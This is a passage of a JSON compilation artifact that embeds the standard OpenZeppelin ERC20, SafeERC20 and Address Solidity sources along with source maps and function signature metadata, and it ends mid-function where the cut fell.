* Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n","sourceMap":"1403:11214:5:-:0;;;1978:113;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2044:5;:13;2052:5;2044;:13;:::i;:::-;-1:-1:-1;2067:7:5;:17;2077:7;2067;:17;:::i;:::-;;1978:113;;1403:11214;;14:127:29;75:10;70:3;66:20;63:1;56:31;106:4;103:1;96:15;130:4;127:1;120:15;146:840;200:5;253:3;246:4;238:6;234:17;230:27;220:55;;271:1;268;261:12;220:55;294:13;;-1:-1:-1;;;;;356:10:29;;;353:36;;;369:18;;:::i;:::-;444:2;438:9;412:2;498:13;;-1:-1:-1;;494:22:29;;;518:2;490:31;486:40;474:53;;;542:18;;;562:22;;;539:46;536:72;;;588:18;;:::i;:::-;628:10;624:2;617:22;663:2;655:6;648:18;685:4;675:14;;730:3;725:2;720;712:6;708:15;704:24;701:33;698:53;;;747:1;744;737:12;698:53;769:1;760:10;;779:133;793:2;790:1;787:9;779:133;;;881:14;;;877:23;;871:30;850:14;;;846:23;;839:63;804:10;;;;779:133;;;954:1;932:15;;;928:24;;;921:35;;;;936:6;146:840;-1:-1:-1;;;;146:840:29:o;991:562::-;1090:6;1098;1151:2;1139:9;1130:7;1126:23;1122:32;1119:52;;;1167:1;1164;1157:12;1119:52;1194:16;;-1:-1:-1;;;;;1259:14:29;;;1256:34;;;1286:1;1283;1276:12;1256:34;1309:61;1362:7;1353:6;1342:9;1338:22;1309:61;:::i;:::-;1299:71;;1416:2;1405:9;1401:18;1395:25;1379:41;;1445:2;1435:8;1432:16;1429:36;;;1461:1;1458;1451:12;1429:36;;1484:63;1539:7;1528:8;1517:9;1513:24;1484:63;:::i;:::-;1474:73;;;991:562;;;;;:::o;1558:380::-;1637:1;1633:12;;;;1680;;;1701:61;;1755:4;1747:6;1743:17;1733:27;;1701:61;1808:2;1800:6;1797:14;1777:18;1774:38;1771:161;;1854:10;1849:3;1845:20;1842:1;1835:31;1889:4;1886:1;1879:15;1917:4;1914:1;1907:15;1771:161;;1558:380;;;:::o;2069:545::-;2171:2;2166:3;2163:11;2160:448;;;2207:1;2232:5;2228:2;2221:17;2277:4;2273:2;2263:19;2347:2;2335:10;2331:19;2328:1;2324:27;2318:4;2314:38;2383:4;2371:10;2368:20;2365:47;;;-1:-1:-1;2406:4:29;2365:47;2461:2;2456:3;2452:12;2449:1;2445:20;2439:4;2435:31;2425:41;;2516:82;2534:2;2527:5;2524:13;2516:82;;;2579:17;;;2560:1;2549:13;2516:82;;;2520:3;;;2160:448;2069:545;;;:::o;2790:1352::-;2910:10;;-1:-1:-1;;;;;2932:30:29;;2929:56;;;2965:18;;:::i;:::-;2994:97;3084:6;3044:38;3076:4;3070:11;3044:38;:::i;:::-;3038:4;2994:97;:::i;:::-;3146:4;;3210:2;3199:14;;3227:1;3222:663;;;;3929:1;3946:6;3943:89;;;-1:-1:-1;3998:19:29;;;3992:26;3943:89;-1:-1:-1;;2747:1:29;2743:11;;;2739:24;2735:29;2725:40;2771:1;2767:11;;;2722:57;4045:81;;3192:944;;3222:663;2016:1;2009:14;;;2053:4;2040:18;;-1:-1:-1;;3258:20:29;;;3376:236;3390:7;3387:1;3384:14;3376:236;;;3479:19;;;3473:26;3458:42;;3571:27;;;;3539:1;3527:14;;;;3406:19;;3376:236;;;3380:3;3640:6;3631:7;3628:19;3625:201;;;3701:19;;;3695:26;-1:-1:-1;;3784:1:29;3780:14;;;3796:3;3776:24;3772:37;3768:42;3753:58;3738:74;;3625:201;-1:-1:-1;;;;;3872:1:29;3856:14;;;3852:22;3839:36;;-1:-1:-1;2790:1352:29:o;:::-;1403:11214:5;;;;;;","sourceMapDeployed":"1403:11214:5:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2156:98;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4433:197;;;;;;:::i;:::-;;:::i;:::-;;;1169:14:29;;1162:22;1144:41;;1132:2;1117:18;4433:197:5;1004:187:29;3244:106:5;3331:12;;3244:106;;;1342:25:29;;;1330:2;1315:18;3244:106:5;1196:177:29;5192:286:5;;;;;;:::i;:::-;;:::i;3093:91::-;;;3175:2;1853:36:29;;1841:2;1826:18;3093:91:5;1711:184:29;5873:234:5;;;;;;:::i;:::-;;:::i;3408:125::-;;;;;;:::i;:::-;-1:-1:-1;;;;;3508:18:5;3482:7;3508:18;;;;;;;;;;;;3408:125;2367:102;;;:::i;6594:427::-;;;;;;:::i;:::-;;:::i;3729:189::-;;;;;;:::i;:::-;;:::i;3976:149::-;;;;;;:::i;:::-;;:::i;2156:98::-;2210:13;2242:5;2235:12;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2156:98;:::o;4433:197::-;4516:4;719:10:11;4570:32:5;719:10:11;4586:7:5;4595:6;4570:8;:32::i;:::-;4619:4;4612:11;;;4433:197;;;;;:::o;5192:286::-;5319:4;719:10:11;5375:38:5;5391:4;719:10:11;5406:6:5;5375:15;:38::i;:::-;5423:27;5433:4;5439:2;5443:6;5423:9;:27::i;:::-;-1:-1:-1;5467:4:5;;5192:286;-1:-1:-1;;;;5192:286:5:o;5873:234::-;5961:4;719:10:11;6015:64:5;719:10:11;6031:7:5;6068:10;6040:25;719:10:11;6031:7:5;6040:9;:25::i;:::-;:38;;;;:::i;:::-;6015:8;:64::i;2367:102::-;2423:13;2455:7;2448:14;;;;;:::i;6594:427::-;6687:4;719:10:11;6687:4:5;6768:25;719:10:11;6785:7:5;6768:9;:25::i;:::-;6741:52;;6831:15;6811:16;:35;;6803:85;;;;-1:-1:-1;;;6803:85:5;;3170:2:29;6803:85:5;;;3152:21:29;3209:2;3189:18;;;3182:30;3248:34;3228:18;;;3221:62;-1:-1:-1;;;3299:18:29;;;3292:35;3344:19;;6803:85:5;;;;;;;;;6922:60;6931:5;6938:7;6966:15;6947:16;:34;6922:8;:60::i;3729:189::-;3808:4;719:10:11;3862:28:5;719:10:11;3879:2:5;3883:6;3862:9;:28::i;3976:149::-;-1:-1:-1;;;;;4091:18:5;;;4065:7;4091:18;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;3976:149::o;10110:370::-;-1:-1:-1;;;;;10241:19:5;;10233:68;;;;-1:-1:-1;;;10233:68:5;;3576:2:29;10233:68:5;;;3558:21:29;3615:2;3595:18;;;3588:30;3654:34;3634:18;;;3627:62;-1:-1:-1;;;3705:18:29;;;3698:34;3749:19;;10233:68:5;3374:400:29;10233:68:5;-1:-1:-1;;;;;10319:21:5;;10311:68;;;;-1:-1:-1;;;10311:68:5;;3981:2:29;10311:68:5;;;3963:21:29;4020:2;4000:18;;;3993:30;4059:34;4039:18;;;4032:62;-1:-1:-1;;;4110:18:29;;;4103:32;4152:19;;10311:68:5;3779:398:29;10311:68:5;-1:-1:-1;;;;;10390:18:5;;;;;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;:36;;;10441:32;;1342:25:29;;;10441:32:5;;1315:18:29;10441:32:5;;;;;;;10110:370;;;:::o;10761:441::-;10891:24;10918:25;10928:5;10935:7;10918:9;:25::i;:::-;10891:52;;-1:-1:-1;;10957:16:5;:37;10953:243;;11038:6;11018:16;:26;;11010:68;;;;-1:-1:-1;;;11010:68:5;;4384:2:29;11010:68:5;;;4366:21:29;4423:2;4403:18;;;4396:30;4462:31;4442:18;;;4435:59;4511:18;;11010:68:5;4182:353:29;11010:68:5;11120:51;11129:5;11136:7;11164:6;11145:16;:25;11120:8;:51::i;:::-;10881:321;10761:441;;;:::o;7475:651::-;-1:-1:-1;;;;;7601:18:5;;7593:68;;;;-1:-1:-1;;;7593:68:5;;4742:2:29;7593:68:5;;;4724:21:29;4781:2;4761:18;;;4754:30;4820:34;4800:18;;;4793:62;-1:-1:-1;;;4871:18:29;;;4864:35;4916:19;;7593:68:5;4540:401:29;7593:68:5;-1:-1:-1;;;;;7679:16:5;;7671:64;;;;-1:-1:-1;;;7671:64:5;;5148:2:29;7671:64:5;;;5130:21:29;5187:2;5167:18;;;5160:30;5226:34;5206:18;;;5199:62;-1:-1:-1;;;5277:18:29;;;5270:33;5320:19;;7671:64:5;4946:399:29;7671:64:5;-1:-1:-1;;;;;7817:15:5;;7795:19;7817:15;;;;;;;;;;;7850:21;;;;7842:72;;;;-1:-1:-1;;;7842:72:5;;5552:2:29;7842:72:5;;;5534:21:29;5591:2;5571:18;;;5564:30;5630:34;5610:18;;;5603:62;-1:-1:-1;;;5681:18:29;;;5674:36;5727:19;;7842:72:5;5350:402:29;7842:72:5;-1:-1:-1;;;;;7948:15:5;;;:9;:15;;;;;;;;;;;7966:20;;;7948:38;;8006:13;;;;;;;;:23;;7980:6;;7948:9;8006:23;;7980:6;;8006:23;:::i;:::-;;;;;;;;8060:2;-1:-1:-1;;;;;8045:26:5;8054:4;-1:-1:-1;;;;;8045:26:5;;8064:6;8045:26;;;;1342:25:29;;1330:2;1315:18;;1196:177;8045:26:5;;;;;;;;8082:37;11786:121;14:548:29;126:4;155:2;184;173:9;166:21;216:6;210:13;259:6;254:2;243:9;239:18;232:34;284:1;294:140;308:6;305:1;302:13;294:140;;;403:14;;;399:23;;393:30;369:17;;;388:2;365:26;358:66;323:10;;294:140;;;298:3;483:1;478:2;469:6;458:9;454:22;450:31;443:42;553:2;546;542:7;537:2;529:6;525:15;521:29;510:9;506:45;502:54;494:62;;;;14:548;;;;:::o;567:173::-;635:20;;-1:-1:-1;;;;;684:31:29;;674:42;;664:70;;730:1;727;720:12;664:70;567:173;;;:::o;745:254::-;813:6;821;874:2;862:9;853:7;849:23;845:32;842:52;;;890:1;887;880:12;842:52;913:29;932:9;913:29;:::i;:::-;903:39;989:2;974:18;;;;961:32;;-1:-1:-1;;;745:254:29:o;1378:328::-;1455:6;1463;1471;1524:2;1512:9;1503:7;1499:23;1495:32;1492:52;;;1540:1;1537;1530:12;1492:52;1563:29;1582:9;1563:29;:::i;:::-;1553:39;;1611:38;1645:2;1634:9;1630:18;1611:38;:::i;:::-;1601:48;;1696:2;1685:9;1681:18;1668:32;1658:42;;1378:328;;;;;:::o;1900:186::-;1959:6;2012:2;2000:9;1991:7;1987:23;1983:32;1980:52;;;2028:1;2025;2018:12;1980:52;2051:29;2070:9;2051:29;:::i;:::-;2041:39;1900:186;-1:-1:-1;;;1900:186:29:o;2091:260::-;2159:6;2167;2220:2;2208:9;2199:7;2195:23;2191:32;2188:52;;;2236:1;2233;2226:12;2188:52;2259:29;2278:9;2259:29;:::i;:::-;2249:39;;2307:38;2341:2;2330:9;2326:18;2307:38;:::i;:::-;2297:48;;2091:260;;;;;:::o;2356:380::-;2435:1;2431:12;;;;2478;;;2499:61;;2553:4;2545:6;2541:17;2531:27;;2499:61;2606:2;2598:6;2595:14;2575:18;2572:38;2569:161;;2652:10;2647:3;2643:20;2640:1;2633:31;2687:4;2684:1;2677:15;2715:4;2712:1;2705:15;2569:161;;2356:380;;;:::o;2741:222::-;2806:9;;;2827:10;;;2824:133;;;2879:10;2874:3;2870:20;2867:1;2860:31;2914:4;2911:1;2904:15;2942:4;2939:1;2932:15","constructor":{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:constructor","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","inputs":[{"name":"name_","kind":"String","internalType":"string"},{"name":"symbol_","kind":"String","internalType":"string"}]},"functions":[{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:allowance(address,address)(uint256)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"allowance(address,address):(uint256)","shortSignature":"dd62ed3e","name":"allowance","inputs":[{"name":"owner","kind":"Address","internalType":"address"},{"name":"spender","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:approve(address,uint256)(bool)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"approve(address,uint256):(bool)","shortSignature":"095ea7b3","name":"approve","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:balanceOf(address)(uint256)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"balanceOf(address):(uint256)","shortSignature":"70a08231","name":"balanceOf","inputs":[{"name":"account","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:decimals()(uint8)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"decimals():(uint8)","shortSignature":"313ce567","name":"decimals","inputs":[],"outputs":[{"name":"","kind":{"Uint":8},"internalType":"uint8"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:decreaseAllowance(address,uint256)(bool)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"decreaseAllowance(address,uint256):(bool)","shortSignature":"a457c2d7","name":"decreaseAllowance","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"subtractedValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:increaseAllowance(address,uint256)(bool)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"increaseAllowance(address,uint256):(bool)","shortSignature":"39509351","name":"increaseAllowance","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"addedValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:name()(string)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"name():(string)","shortSignature":"06fdde03","name":"name","inputs":[],"outputs":[{"name":"","kind":"String","internalType":"string"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:symbol()(string)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"symbol():(string)","shortSignature":"95d89b41","name":"symbol","inputs":[],"outputs":[{"name":"","kind":"String","internalType":"string"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:totalSupply()(uint256)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"totalSupply():(uint256)","shortSignature":"18160ddd","name":"totalSupply","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:transfer(address,uint256)(bool)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"transfer(address,uint256):(bool)","shortSignature":"a9059cbb","name":"transfer","inputs":[{"name":"to","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20:transferFrom(address,address,uint256)(bool)","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","signature":"transferFrom(address,address,uint256):(bool)","shortSignature":"23b872dd","name":"transferFrom","inputs":[{"name":"from","kind":"Address","internalType":"address"},{"name":"to","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[]},{"name":"SafeERC20","artifactPath":"out/SafeERC20.sol/SafeERC20.json","sourcePath":"node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:SafeERC20","sourceFileId":9,"sourceContent":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/utils/SafeERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\nimport \"../extensions/draft-IERC20Permit.sol\";\nimport \"../../../utils/Address.sol\";\n\n/**\n * @title SafeERC20\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\n * contract returns false). Tokens that return no value (and instead revert or\n * throw on failure) are also supported, non-reverting calls are assumed to be\n * successful.\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n */\nlibrary SafeERC20 {\n    using Address for address;\n\n    function safeTransfer(\n        IERC20 token,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n    }\n\n    function safeTransferFrom(\n        IERC20 token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n    }\n\n    /**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * {IERC20-approve}, and its usage is discouraged.\n     *\n     * Whenever possible, use {safeIncreaseAllowance} and\n     * {safeDecreaseAllowance} instead.\n     */\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n\n    function safeIncreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n    }\n\n    function safeDecreaseAllowance(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        unchecked {\n            uint256 oldAllowance = token.allowance(address(this), spender);\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\n            uint256 newAllowance = oldAllowance - value;\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n        }\n    }\n\n    function safePermit(\n        IERC20Permit token,\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal {\n        uint256 nonceBefore = token.nonces(owner);\n        token.permit(owner, spender, value, deadline, v, r, s);\n        uint256 nonceAfter = token.nonces(owner);\n        require(nonceAfter == nonceBefore + 1, \"SafeERC20: permit did not succeed\");\n    }\n\n    /**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n        // the target address contains contract code and also asserts for success in the low-level call.\n\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\n        if (returndata.length > 0) {\n            // Return data is optional\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n        }\n    }\n}\n","sourceMap":"707:3748:9:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;707:3748:9;;;;;;;;;;;;;;;;;","sourceMapDeployed":"707:3748:9:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"Address","artifactPath":"out/Address.sol/Address.json","sourcePath":"node_modules/@openzeppelin/contracts/utils/Address.sol","contractId":"node_modules/@openzeppelin/contracts/utils/Address.sol:Address","sourceFileId":10,"sourceContent":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)\n\npragma solidity ^0.8.1;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: 